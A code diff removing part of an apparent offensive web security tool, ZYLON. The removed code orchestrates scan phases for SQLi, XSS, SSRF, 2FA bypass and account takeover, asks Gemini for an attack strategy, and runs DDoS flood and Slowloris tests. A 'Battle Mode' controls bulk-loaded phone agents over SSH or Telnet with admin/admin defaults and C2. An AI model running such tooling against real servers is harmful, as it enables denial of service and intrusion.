-            ('82', 'Cross-Domain Discovery', self._scan_cross_domain),
-        ]
-        for scan_id, name, func in phase2_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 3: AI ANALYSIS (Get AI guidance before vuln scanning) ==========
-        console.print(f"\n[bold magenta][PHASE 3] AI Tactical Analysis[/bold magenta]")
-        ai_recommendations = None
-        if self.ai.gemini_api_key:
-            try:
-                console.print(f"  [magenta]-> Querying Gemini AI for attack strategy...[/magenta]")
-                # Gather recon findings for AI
-                recon_data = {}
-                for key in ['recon', 'dns', 'subdomains', 'headers', 'ssl', 'waf', 'techstack',
-                            'subdomain_brute', 'cdn_detection', 'ports', 'email_security']:
-                    if key in self.results.get('findings', {}):
-                        recon_data[key] = str(self.results['findings'][key])[:500]
-                
-                ai_recommendations = self.ai.ai_smart_scan(self.target, recon_data)
-                if ai_recommendations:
-                    console.print(Panel(
-                        ai_recommendations[:2000],
-                        title="[bold magenta]AI Attack Strategy[/bold magenta]",
-                        border_style="magenta"
-                    ))
-            except Exception as e:
-                console.print(f"  [yellow]  AI analysis skipped: {str(e)[:50]}[/yellow]")
-        else:
-            console.print(f"  [yellow]  AI not configured, proceeding with standard workflow[/yellow]")
-
-        # ========== PHASE 4: CONTENT DISCOVERY ==========
-        console.print(f"\n[bold yellow][PHASE 4] Content Discovery[/bold yellow]")
-        phase4_scans = [
-            ('11', 'Directory Brute Force', self._scan_dirbrute),
-            ('85', 'Async Dir Brute Force', self._scan_dir_brute_async),
-            ('23', 'Deep Web Crawler', self._scan_deep_crawl),
-            ('24', 'Parameter Mining', self._scan_param_mining),
-            ('25', 'Wayback URLs', self._scan_wayback),
-            ('17', 'JS Sensitive Data', self._scan_javascript),
-            ('28', 'Deep JS Analysis', self._scan_deep_js),
-            ('46', 'Sensitive File Scanner', self._scan_sensitive_files),
-            ('44', 'API Endpoint Discovery', self._scan_api_fuzzer),
-        ]
-        for scan_id, name, func in phase4_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 5: VULNERABILITY SCANNING (The heavy hits) ==========
-        console.print(f"\n[bold red][PHASE 5] Vulnerability Scanning[/bold red]")
-        phase5_scans = [
-            ('9', 'SQL Injection', self._scan_sqli),
-            ('10', 'XSS Scanner', self._scan_xss),
-            ('13', 'CORS Check', self._scan_cors),
-            ('14', 'Open Redirect', self._scan_openredirect),
-            ('15', 'CRLF Injection', self._scan_crlf),
-            ('30', 'SSRF Scanner', self._scan_ssrf),
-            ('31', 'SSTI Scanner', self._scan_ssti),
-            ('32', 'Path Traversal/LFI', self._scan_lfi),
-            ('33', 'XXE Scanner', self._scan_xxe),
-            ('36', 'Prototype Pollution', self._scan_proto_pollution),
-            ('37', 'Cache Poisoning', self._scan_cache_poison),
-            ('38', 'HTTP Smuggling', self._scan_smuggling),
-            ('39', 'Host Header Injection', self._scan_host_header),
-            ('40', 'JWT Scanner', self._scan_jwt),
-            ('45', 'Rate Limit Tester', self._scan_rate_limit),
-        ]
-        for scan_id, name, func in phase5_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 6: ADVANCED ATTACKS ==========
-        console.print(f"\n[bold red][PHASE 6] Advanced Attack Vectors[/bold red]")
-        phase6_scans = [
-            ('56', 'GraphQL Security', self._scan_graphql),
-            ('57', 'DOM XSS', self._scan_dom_xss),
-            ('61', 'Clickjacking', self._scan_clickjacking),
-            ('62', 'CSP Analysis', self._scan_csp),
-            ('65', 'HTTP Method Tampering', self._scan_http_method),
-            ('71', 'Blind XSS', self._scan_blind_xss),
-            ('72', 'WebSocket Security', self._scan_websocket),
-            ('73', '2FA Bypass', self._scan_2fa_bypass),
-            ('74', 'Mixed Content', self._scan_mixed_content),
-            ('75', 'Info Disclosure', self._scan_info_disclosure),
-            ('79', 'Framework Attacks', self._scan_framework),
-            ('80', 'JS Library Vulns', self._scan_js_libraries),
-            ('81', '403 Bypass', self._scan_403_bypass),
-            ('78', 'CSRF Detection', self._scan_csrf),
-            ('76', 'Username Enum', self._scan_username_enum),
-        ]
-        for scan_id, name, func in phase6_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 7: ORIGIN IP + DEEP TECHNIQUES ==========
-        console.print(f"\n[bold yellow][PHASE 7] Origin IP & Deep Techniques[/bold yellow]")
-        phase7_scans = [
-            ('50', 'Origin IP Quick', self._scan_origin_ip_quick),
-            ('55', 'Direct IP Verify', self._scan_ip_verify),
-            ('66', 'Shodan InternetDB', self._scan_shodan_internetdb),
-            ('67', 'Favicon Hash', self._scan_favicon_hash),
-            ('83', 'CVE-to-Exploit', self._scan_cve_lookup),
-            ('49', 'Tech Version CVE', self._scan_tech_cve),
-            ('26', 'Google Dorking', self._scan_google_dork),
-            ('27', 'GitHub Dorking', self._scan_github_dork),
-            ('68', 'Pastebin Dork', self._scan_pastebin_dork),
-            ('69', 'URL Shortener', self._scan_url_shortener),
-            ('29', 'Subdomain Takeover', self._scan_takeover),
-            ('16', 'Cookie Security', self._scan_cookies),
-            ('41', 'Broken Auth', self._scan_broken_auth),
-            ('34', 'IDOR Detector', self._scan_idor),
-            ('35', 'Race Condition', self._scan_race),
-            ('59', 'DNS Zone Transfer', self._scan_dns_zone_transfer),
-            ('60', 'Cache Deception', self._scan_cache_deception),
-            ('63', 'Account Takeover', self._scan_account_takeover),
-            ('64', 'OAuth Security', self._scan_oauth),
-        ]
-        for scan_id, name, func in phase7_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 7.5: DDoS DEFENSE TESTS ==========
-        console.print(f"\n[bold red][PHASE 7.5] DDoS Defense Testing[/bold red]")
-        ddos_scans = [
-            ('89', 'HTTPS Flood Resilience', self.ddos.test_https_flood_resilience),
-            ('90', 'Slowloris Vulnerability', self.ddos.test_slowloris),
-            ('91', 'Slow POST Vulnerability', self.ddos.test_slow_post),
-            ('92', 'Rate Limit Detection', self.ddos.test_rate_limit),
-            ('93', 'Connection Capacity', self.ddos.test_connection_capacity),
-        ]
-        url = f"{self.protocol}{self.target}"
-        for scan_id, name, func in ddos_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                if scan_id == '89':
-                    result = func(url, threads=5, requests_per_thread=10, duration=15)
-                elif scan_id == '90':
-                    result = func(url, connections=10, duration=10)
-                elif scan_id == '91':
-                    result = func(url, connections=3)
-                elif scan_id == '92':
-                    result = func(url, total_requests=30, threads=5)
-                elif scan_id == '93':
-                    result = func(url, max_connections=25)
-                else:
-                    result = func(url)
-                if result:
-                    self.results['findings'][f'ddos_{name.lower().replace(" ", "_")}'] = result
-                    vuln = result.get('vulnerable') or result.get('protection_detected') or result.get('rate_limit_detected')
-                    c = 'green' if vuln else 'yellow'
-                    console.print(f"  [{c}]  {result.get('verdict', 'Done')}[/{c}]")
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 8: AI TRIAGE & FINAL REPORT ==========
-        console.print(f"\n[bold magenta][PHASE 8] AI Triage & Final Report[/bold magenta]")
-        
-        # AI Triage
-        if self.ai.gemini_api_key and self.results.get('findings'):
-            try:
-                console.print(f"  [magenta]-> Running AI vulnerability triage...[/magenta]")
-                findings_list = []
-                for category, data in self.results['findings'].items():
-                    findings_list.append({'category': category, 'data': str(data)[:300]})
-                triage = self.ai.ai_triage(self.target, findings_list)
-                if triage:
-                    console.print(Panel(
-                        triage[:3000],
-                        title="[bold magenta]AI Vulnerability Triage[/bold magenta]",
-                        border_style="magenta"
-                    ))
-            except Exception:
-                pass
-
-        # Generate final report
-        self.reports.generate_html_report(self.results, self.target)
-        
-        # Summary
-        elapsed = round(time.time() - start_time, 1)
-        total_findings = len(self.results.get('findings', {}))
-        vuln_count = sum(1 for k, v in self.results.get('findings', {}).items()
-                        if isinstance(v, dict) and (v.get('vulnerable') or v.get('misconfigured') or v.get('exposed')))
-        
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            f"[bold white]   BEAST MODE COMPLETE[/bold white]\n\n"
-            f"[bold yellow]   Total Modules Run: 55+[/bold yellow]\n"
-            f"[bold cyan]   Findings: {total_findings}[/bold cyan]\n"
-            f"[bold red]   Vulnerabilities: {vuln_count}[/bold red]\n"
-            f"[bold green]   Time: {elapsed}s[/bold green]\n"
-            f"[bold cyan]   Report: ~/.zylon/reports/[/bold cyan]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-
-    # ========================================================================
-    # V6.0 DDoS DEFENSE TESTING MODULES (89-93)
-    # ========================================================================
-
-    def _ddos_config_prompt(self, test_name):
-        """Interactive prompt for DDoS test configuration"""
-        console.print(f"\n[bold cyan][*] {test_name} - Configuration[/bold cyan]")
-        console.print("[dim]   Press Enter for defaults | Ctrl+C to cancel[/dim]\n")
-        
-        threads = IntPrompt.ask(
-            "[bold yellow]   Concurrent threads/connections[/bold yellow]",
-            default=10
-        )
-        requests_per_thread = IntPrompt.ask(
-            "[bold yellow]   Requests per thread[/bold yellow]",
-            default=20
-        )
-        duration = IntPrompt.ask(
-            "[bold yellow]   Max duration (seconds)[/bold yellow]",
-            default=30
-        )
-        
-        console.print(f"\n[bold green]   Config: {threads} threads × {requests_per_thread} reqs = ~{threads * requests_per_thread} total | {duration}s max[/bold green]")
-        return threads, requests_per_thread, duration
-
-    def _scan_ddos_https_flood(self):
-        """Scan 89: HTTPS Flood Resilience Test"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] HTTPS Flood Resilience Test on {self.target}[/bold red]")
-        console.print("[dim]   Tests if WAF/CDN blocks high-frequency HTTPS requests[/dim]")
-        
-        threads, reqs_per_thread, duration = self._ddos_config_prompt("HTTPS Flood Test")
-        
-        with console.status(f"[bold red]Sending HTTPS flood ({threads} threads × {reqs_per_thread} reqs)...[/bold red]"):
-            result = self.ddos.test_https_flood_resilience(
-                url, threads=threads, requests_per_thread=reqs_per_thread, duration=duration
-            )
-        
-        self.results['findings']['ddos_https_flood'] = result
-        
-        # Display results
-        verdict_color = 'green' if result.get('protection_detected') else 'red'
-        console.print(Panel(
-            f"[bold]Test:[/bold] HTTPS Flood Resilience\n"
-            f"[bold]Total Requests:[/bold] {result.get('total_requests_sent', 0)}\n"
-            f"[bold]Successful:[/bold] {result.get('successful_requests', 0)} | "
-            f"[bold]Blocked:[/bold] {result.get('blocked_requests', 0)} | "
-            f"[bold]Errors:[/bold] {result.get('error_requests', 0)}\n"
-            f"[bold]Avg Response:[/bold] {result.get('avg_response_time_ms', 0)}ms | "
-            f"[bold]Max Response:[/bold] {result.get('max_response_time_ms', 0)}ms\n"
-            f"[bold]First Block After:[/bold] {result.get('first_block_after', 'N/A')}s\n"
-            f"[bold]Blocking Codes:[/bold] {result.get('blocking_status_codes', {})}\n"
-            f"[bold]Degradation:[/bold] {'Yes' if result.get('degradation_detected') else 'No'}\n\n"
-            f"[bold {verdict_color}]VERDICT: {result.get('verdict', 'Unknown')}[/bold {verdict_color}]",
-            title="[bold red]HTTPS Flood Results[/bold red]",
-            border_style="red",
-            box=box.HEAVY
-        ))
-
-    def _scan_ddos_slowloris(self):
-        """Scan 90: Slowloris Vulnerability Test"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Slowloris Vulnerability Test on {self.target}[/bold red]")
-        console.print("[dim]   Tests if server is vulnerable to slow connection exhaustion[/dim]")
-        
-        threads, _, duration = self._ddos_config_prompt("Slowloris Test")
-        
-        with console.status(f"[bold red]Opening {threads} slow connections for {duration}s...[/bold red]"):
-            result = self.ddos.test_slowloris(
-                url, connections=threads, duration=duration
-            )
-        
-        self.results['findings']['ddos_slowloris'] = result
-        
-        vuln = result.get('vulnerable', False)
-        verdict_color = 'red' if vuln else 'green'
-        console.print(Panel(
-            f"[bold]Test:[/bold] Slowloris Vulnerability\n"
-            f"[bold]Connections Opened:[/bold] {result.get('connections_opened', 0)}/{result.get('connections_attempted', 0)}\n"
-            f"[bold]Connections Maintained:[/bold] {result.get('connections_maintained', 0)}\n"
-            f"[bold]Connections Dropped:[/bold] {result.get('connections_dropped', 0)}\n"
-            f"[bold]Normal Response:[/bold] {result.get('normal_response_time_ms', 0)}ms\n"
-            f"[bold]Under Load Response:[/bold] {result.get('under_load_response_time_ms', 'N/A')}ms\n\n"
-            f"[bold {verdict_color}]VERDICT: {result.get('verdict', 'Unknown')}[/bold {verdict_color}]",
-            title="[bold red]Slowloris Results[/bold red]",
-            border_style="red",
-            box=box.HEAVY
-        ))
-
-    def _scan_ddos_slow_post(self):
-        """Scan 91: Slow POST Vulnerability Test"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Slow POST Vulnerability Test on {self.target}[/bold red]")
-        console.print("[dim]   Tests if server accepts very slow POST body uploads[/dim]")
-        
-        threads, _, duration = self._ddos_config_prompt("Slow POST Test")
-        
-        with console.status(f"[bold red]Sending {threads} slow POST connections...[/bold red]"):
-            result = self.ddos.test_slow_post(
-                url, connections=threads, chunk_delay=1.0
-            )
-        
-        self.results['findings']['ddos_slow_post'] = result
-        
-        vuln = result.get('vulnerable', False)
-        verdict_color = 'red' if vuln else 'green'
-        console.print(Panel(
-            f"[bold]Test:[/bold] Slow POST Vulnerability\n"
-            f"[bold]Connections Opened:[/bold] {result.get('connections_opened', 0)}\n"
-            f"[bold]Connections Accepted (vulnerable):[/bold] {result.get('connections_accepted', 0)}\n"
-            f"[bold]Connections Rejected (protected):[/bold] {result.get('connections_rejected', 0)}\n\n"
-            f"[bold {verdict_color}]VERDICT: {result.get('verdict', 'Unknown')}[/bold {verdict_color}]",
-            title="[bold red]Slow POST Results[/bold red]",
-            border_style="red",
-            box=box.HEAVY
-        ))
-
-    def _scan_ddos_rate_limit(self):
-        """Scan 92: Rate Limit Detection"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Rate Limit Detection on {self.target}[/bold red]")
-        console.print("[dim]   Finds the threshold where rate limiting kicks in[/dim]")
-        
-        threads, total_reqs, _ = self._ddos_config_prompt("Rate Limit Test")
-        
-        with console.status(f"[bold red]Sending {total_reqs} requests across {threads} threads...[/bold red]"):
-            result = self.ddos.test_rate_limit(
-                url, total_requests=total_reqs, threads=threads
-            )
-        
-        self.results['findings']['ddos_rate_limit'] = result
-        
-        protected = result.get('rate_limit_detected', False)
-        verdict_color = 'green' if protected else 'red'
-        console.print(Panel(
-            f"[bold]Test:[/bold] Rate Limit Detection\n"
-            f"[bold]Successful:[/bold] {result.get('successful', 0)} | "
-            f"[bold]Rate Limited:[/bold] {result.get('rate_limited', 0)} | "
-            f"[bold]Errors:[/bold] {result.get('errors', 0)}\n"
-            f"[bold]Limit Type:[/bold] {result.get('rate_limit_type', 'N/A')}\n"
-            f"[bold]Requests Until Limit:[/bold] {result.get('requests_until_limit', 'N/A')}\n"
-            f"[bold]Blocking Code:[/bold] {result.get('blocking_status_code', 'N/A')}\n"
-            f"[bold]Rate Limit Header:[/bold] {result.get('rate_limit_header', 'N/A')}\n\n"
-            f"[bold {verdict_color}]VERDICT: {result.get('verdict', 'Unknown')}[/bold {verdict_color}]",
-            title="[bold red]Rate Limit Results[/bold red]",
-            border_style="red",
-            box=box.HEAVY
-        ))
-
-    def _scan_ddos_connection_capacity(self):
-        """Scan 93: Connection Capacity Test"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Connection Capacity Test on {self.target}[/bold red]")
-        console.print("[dim]   Tests max concurrent connections before server degrades[/dim]")
-        
-        max_conns, _, _ = self._ddos_config_prompt("Connection Capacity Test")
-        
-        with console.status(f"[bold red]Opening up to {max_conns} connections...[/bold red]"):
-            result = self.ddos.test_connection_capacity(
-                url, max_connections=max_conns
-            )
-        
-        self.results['findings']['ddos_connection_capacity'] = result
-        
-        console.print(Panel(
-            f"[bold]Test:[/bold] Connection Capacity\n"
-            f"[bold]Successful Connections:[/bold] {result.get('successful_connections', 0)}\n"
-            f"[bold]Failed Connections:[/bold] {result.get('failed_connections', 0)}\n"
-            f"[bold]Peak Concurrent:[/bold] {result.get('peak_concurrent', 0)}\n"
-            f"[bold]Refusal Point:[/bold] {result.get('refusal_point', 'N/A')}\n"
-            f"[bold]Degradation Point:[/bold] {result.get('degradation_point', 'N/A')}\n"
-            f"[bold]Under Load Response:[/bold] {result.get('under_load_response_ms', 'N/A')}ms\n\n"
-            f"[bold yellow]VERDICT: {result.get('verdict', 'Unknown')}[/bold yellow]",
-            title="[bold red]Connection Capacity Results[/bold red]",
-            border_style="red",
-            box=box.HEAVY
-        ))
-
-    def _scan_ddos_suite(self):
-        """DDoS Defense Suite - Run all DDoS defense tests with smart defaults"""
-        url = f"{self.protocol}{self.target}"
-        start_time = time.time()
-        
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            "[bold white]   DDoS DEFENSE SUITE[/bold white]\n"
-            "[bold red]   Testing Server Protection Resilience[/bold red]\n"
-            f"[bold yellow]   Target: {self.target}[/bold yellow]\n"
-            "[dim white]   User-controlled concurrency | Auto-stops on protection detection[/dim white]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-        
-        # Configuration
-        console.print(f"\n[bold yellow][CONFIG] DDoS Suite Settings[/bold yellow]")
-        threads = IntPrompt.ask(
-            "[bold yellow]   Threads/connections per test[/bold yellow]",
-            default=10
-        )
-        reqs = IntPrompt.ask(
-            "[bold yellow]   Requests per thread[/bold yellow]",
-            default=20
-        )
-        duration = IntPrompt.ask(
-            "[bold yellow]   Max duration per test (seconds)[/bold yellow]",
-            default=30
-        )
-        
-        console.print(f"\n[bold green]   Config: {threads} threads | {reqs} reqs/thread | {duration}s max per test[/bold green]")
-        
-        # Ensure findings dict exists
-        if 'findings' not in self.results:
-            self.results['findings'] = {}
-        
-        # Phase 1: HTTPS Flood
-        console.print(f"\n[bold yellow][TEST 1/5] HTTPS Flood Resilience[/bold yellow]")
-        try:
-            with console.status(f"[bold red]Testing HTTPS flood resilience...[/bold red]"):
-                r1 = self.ddos.test_https_flood_resilience(url, threads=threads, requests_per_thread=reqs, duration=duration)
-            self.results['findings']['ddos_https_flood'] = r1
-            c = 'green' if r1.get('protection_detected') else 'red'
-            console.print(f"  [{c}]  {r1.get('verdict', 'Unknown')}[/{c}]")
-        except Exception as e:
-            console.print(f"  [red]  X Error: {str(e)[:60]}[/red]")
-        
-        # Phase 2: Slowloris
-        console.print(f"\n[bold yellow][TEST 2/5] Slowloris Vulnerability[/bold yellow]")
-        try:
-            with console.status(f"[bold red]Testing slow connection exhaustion...[/bold red]"):
-                r2 = self.ddos.test_slowloris(url, connections=threads, duration=duration)
-            self.results['findings']['ddos_slowloris'] = r2
-            c = 'red' if r2.get('vulnerable') else 'green'
-            console.print(f"  [{c}]  {r2.get('verdict', 'Unknown')}[/{c}]")
-        except Exception as e:
-            console.print(f"  [red]  X Error: {str(e)[:60]}[/red]")
-        
-        # Phase 3: Slow POST
-        console.print(f"\n[bold yellow][TEST 3/5] Slow POST Vulnerability[/bold yellow]")
-        try:
-            with console.status(f"[bold red]Testing slow POST body upload...[/bold red]"):
-                r3 = self.ddos.test_slow_post(url, connections=min(threads, 5))
-            self.results['findings']['ddos_slow_post'] = r3
-            c = 'red' if r3.get('vulnerable') else 'green'
-            console.print(f"  [{c}]  {r3.get('verdict', 'Unknown')}[/{c}]")
-        except Exception as e:
-            console.print(f"  [red]  X Error: {str(e)[:60]}[/red]")
-        
-        # Phase 4: Rate Limit
-        console.print(f"\n[bold yellow][TEST 4/5] Rate Limit Detection[/bold yellow]")
-        try:
-            with console.status(f"[bold red]Finding rate limit threshold...[/bold red]"):
-                r4 = self.ddos.test_rate_limit(url, total_requests=threads * reqs, threads=threads)
-            self.results['findings']['ddos_rate_limit'] = r4
-            c = 'green' if r4.get('rate_limit_detected') else 'red'
-            console.print(f"  [{c}]  {r4.get('verdict', 'Unknown')}[/{c}]")
-        except Exception as e:
-            console.print(f"  [red]  X Error: {str(e)[:60]}[/red]")
-        
-        # Phase 5: Connection Capacity
-        console.print(f"\n[bold yellow][TEST 5/5] Connection Capacity[/bold yellow]")
-        try:
-            with console.status(f"[bold red]Testing max concurrent connections...[/bold red]"):
-                r5 = self.ddos.test_connection_capacity(url, max_connections=threads * 5)
-            self.results['findings']['ddos_connection_capacity'] = r5
-            console.print(f"  [yellow]  {r5.get('verdict', 'Unknown')}[/yellow]")
-        except Exception as e:
-            console.print(f"  [red]  X Error: {str(e)[:60]}[/red]")
-        
-        # Generate resilience report
-        report = self.ddos.generate_resilience_report()
-        
-        elapsed = round(time.time() - start_time, 1)
-        
-        # Summary
-        vulns = sum(1 for k, v in self.results.get('findings', {}).items()
-                    if k.startswith('ddos_') and isinstance(v, dict) and v.get('vulnerable'))
-        protections = sum(1 for k, v in self.results.get('findings', {}).items()
-                         if k.startswith('ddos_') and isinstance(v, dict) and 
-                         (v.get('protection_detected') or v.get('rate_limit_detected')))
-        
-        verdict_color = 'green' if vulns == 0 and protections > 0 else 'red' if vulns > 0 else 'yellow'
-        
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            f"[bold white]   DDoS DEFENSE SUITE COMPLETE[/bold white]\n\n"
-            f"[bold yellow]   Tests Run: 5[/bold yellow]\n"
-            f"[bold red]   DoS Vulnerabilities: {vulns}[/bold red]\n"
-            f"[bold green]   Protections Detected: {protections}[/bold green]\n"
-            f"[bold cyan]   Time: {elapsed}s[/bold cyan]\n\n"
-            f"[bold {verdict_color}]   Overall: {report.get('overall_verdict', 'Unknown')}[/bold {verdict_color}]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-        
-        # Recommendations
-        if report.get('recommendations'):
-            console.print(f"\n[bold yellow]Recommendations:[/bold yellow]")
-            for rec in report['recommendations']:
-                console.print(f"  [cyan]- {rec}[/cyan]")
-
-    # ========================================================================
-    # ACADEMY BATTLE MODE (Red Team vs Blue Team)
-    # ========================================================================
-
-    def _battle_mode_menu(self):
-        """Academy Battle Mode - Red Team vs Blue Team interactive menu"""
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            "[bold white]   ACADEMY BATTLE MODE[/bold white]\n"
-            "[bold red]   Red Team (ZYLON) vs Blue Team (Defenders)[/bold red]\n"
-            "[bold yellow]   Connect YOUR phone farm -> Attack YOUR server[/bold yellow]\n"
-            "[dim white]   SSH (port 8022) + Telnet (port 23) | Any Network | Ctrl+C = EMERGENCY STOP[/dim white]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-        
-        while True:
-            console.print(f"\n[bold red]BATTLE[/bold red] [bold yellow]>[/bold yellow] ", end="")
-            try:
-                cmd = input().strip().lower()
-            except (KeyboardInterrupt, EOFError):
-                # Emergency stop
-                self._battle_emergency_stop()
-                break
-            
-            if not cmd:
-                continue
-            
-            if cmd in ['exit', 'quit', 'q', 'back']:
-                self._battle_emergency_stop()
-                console.print("[bold yellow][*] Exiting Battle Mode. All agents stopped.[/bold yellow]")
-                break
-            
-            elif cmd == 'help':
-                self._battle_help()
-            
-            elif cmd == 'add':
-                self._battle_add_agent()
-            
-            elif cmd == 'addbulk':
-                self._battle_add_bulk()
-            
-            elif cmd == 'connect':
-                self._battle_connect()
-            
-            elif cmd == 'status':
-                self._battle_status()
-            
-            elif cmd == 'target':
-                self._battle_set_target()
-            
-            elif cmd == 'recon':
-                self._battle_run_phase('recon')
-            
-            elif cmd == 'flood':
-                self._battle_run_phase('flood')
-            
-            elif cmd == 'slowloris':
-                self._battle_run_phase('slowloris')
-            
-            elif cmd == 'slowpost':
-                self._battle_run_phase('slowpost')
-            
-            elif cmd == 'fullbattle':
-                self._battle_full()
-            
-            elif cmd == 'stop':
-                self._battle_emergency_stop()
-            
-            elif cmd == 'dashboard':
-                self.battle.display_dashboard()
-            
-            elif cmd == 'clear':
-                self.battle = BattleEngine()
-                console.print("[green][+] Battle engine reset[/green]")
-            
-            elif cmd == 'load':
-                self._battle_load_file()
-            
-            elif cmd == 'probe':
-                self._battle_probe()
-            
-            elif cmd == 'c2':
-                self._battle_c2_mode()
-            
-            else:
-                console.print(f"[bold red][!] Unknown command: {cmd}. Type 'help'[/bold red]")
     
-    def _battle_help(self):
-        """Display Battle Mode help"""
-        help_table = Table(
-            title="[bold red]⚔️ Battle Mode Commands[/bold red]",
-            box=box.ROUNDED, border_style="red"
-        )
-        help_table.add_column("Command", style="yellow")
-        help_table.add_column("Description", style="cyan")
-        
-        commands = [
-            ("add", "Add single agent (IP:port user pass)"),
-            ("addbulk", "Add multiple agents from list"),
-            ("load", "Load agents from file (4K+ phones)"),
-            ("connect", "Connect to all registered agents"),
-            ("probe", "Diagnose connection issues (port scan)"),
-            ("status", "Show agent connection status"),
-            ("target", "Set battle target (YOUR server URL)"),
-            ("recon", "Phase 1: Light probing (5 reqs/agent)"),
-            ("flood", "Phase 2: HTTP flood (50 reqs/agent)"),
-            ("slowloris", "Phase 3: Slow connection test"),
-            ("slowpost", "Phase 4: Slow body upload test"),
-            ("fullbattle", "Run all phases sequentially"),
-            ("c2", "HTTP C2 mode (phones behind NAT/cellular)"),
-            ("dashboard", "Show battle statistics"),
-            ("stop", "EMERGENCY STOP all agents"),
-            ("clear", "Reset battle engine"),
-            ("exit/back/q", "Exit Battle Mode (stops all agents)"),
-        ]
-        for cmd, desc in commands:
-            help_table.add_row(cmd, desc)
-        
-        console.print(help_table)
-        console.print("\n[bold yellow]PROTOCOLS: SSH (port 8022/22) or Telnet (port 23) | Auto-detected from port[/bold yellow]")
-        console.print("[bold cyan]TIP: Termux phones use SSH on port 8022 by default. Install sshpass: pkg install sshpass[/bold cyan]")
-    
-    def _battle_add_agent(self):
-        """Add a single agent interactively"""
-        console.print("\n[bold cyan][*] Add Agent (your phone - any network)[/bold cyan]")
-        
-        host = Prompt.ask("[bold yellow]   Phone IP (e.g. 192.168.1.10 or any IP)[/bold yellow]")
-        port = IntPrompt.ask("[bold yellow]   Port (8022=SSH, 23=Telnet)[/bold yellow]", default=8022)
-        username = Prompt.ask("[bold yellow]   Username[/bold yellow]", default="admin")
-        password = Prompt.ask("[bold yellow]   Password[/bold yellow]", default="admin")
-        
-        success, msg = self.battle.add_agent(host, port, username, password)
-        if success:
-            console.print(f"[green][+] {msg}[/green]")
-        else:
-            console.print(f"[bold red][!] {msg}[/bold red]")
-    
-    def _battle_add_bulk(self):
-        """Add multiple agents from bulk input"""
-        console.print("\n[bold cyan][*] Bulk Add Agents[/bold cyan]")
-        console.print("[dim]   Format: IP:PORT:USER:PASS (one per line, empty line to finish)[/dim]")
-        console.print("[dim]   Port 8022=SSH (Termux default), Port 23=Telnet[/dim]")
-        
-        added = 0
-        while True:
-            try:
-                line = input("  > ").strip()
-            except EOFError:
-                break
-            if not line:
-                break
-            
-            parts = line.split(':')
-            if len(parts) >= 4:
-                host, port_str, user, passwd = parts[0], parts[1], parts[2], parts[3]
-                try:
-                    port = int(port_str)
-                except ValueError:
-                    console.print(f"  [red]Invalid port: {port_str}[/red]")
-                    continue
-                success, msg = self.battle.add_agent(host, port, user, passwd)
-                if success:
-                    console.print(f"  [green][+] {msg}[/green]")
-                    added += 1
-                else:
-                    console.print(f"  [red][!] {msg}[/red]")
-            elif len(parts) == 2:
-                # IP:PORT with default creds
-                host, port_str = parts
-                try:
-                    port = int(port_str)
-                except ValueError:
-                    console.print(f"  [red]Invalid port: {port_str}[/red]")
-                    continue
-                success, msg = self.battle.add_agent(host, port, "admin", "admin")
-                if success:
-                    console.print(f"  [green][+] {msg} (default: admin/admin)[/green]")
-                    added += 1
-                else:
-                    console.print(f"  [red][!] {msg}[/red]")
-            else:
-                console.print(f"  [red]Invalid format. Use IP:PORT:USER:PASS[/red]")
-        
-        console.print(f"\n[bold green][+] {added} agents added. Use 'connect' to connect.[/bold green]")
-    
-    def _battle_connect(self):
-        """Connect to all registered agents"""
-        if not self.battle.agents:
-            console.print("[bold red][!] No agents registered. Use 'add' or 'addbulk' first.[/bold red]")
-            return
-        
-        console.print(f"\n[bold cyan][*] Connecting to {len(self.battle.agents)} agents...[/bold cyan]")
-        
-        success, results = self.battle.connect_all()
-        
-        for agent_id, host, proto, ok, msg in results:
-            status = "OK" if ok else "X"
-            console.print(f"  [{status}] Agent {agent_id} ({host}) [{proto.upper()}]: {msg}")
-        
-        connected = sum(1 for a in self.battle.agents if a.connected)
-        console.print(f"\n[bold {'green' if connected > 0 else 'red'}][+] {connected}/{len(self.battle.agents)} agents connected[/bold {'green' if connected > 0 else 'red'}]")
-    
-    def _battle_status(self):
-        """Show agent status"""
-        if not self.battle.agents:
-            console.print("[bold red][!] No agents registered[/bold red]")
-            return
-        
-        self.battle.display_dashboard()
-    
-    def _battle_set_target(self):
-        """Set battle target (YOUR server URL)"""
-        target = Prompt.ask("[bold yellow]   Target URL (YOUR server, e.g. http://192.168.1.100:8080)[/bold yellow]")
-        
-        if target.strip():
-            self.battle.target = target.strip()
-            console.print(f"[green][+] Battle target set: {target.strip()}[/green]")
-        else:
-            console.print(f"[bold red][!] Empty target URL[/bold red]")
-    
-    def _battle_run_phase(self, phase):
-        """Run a specific battle phase"""
-        if not self.battle.agents:
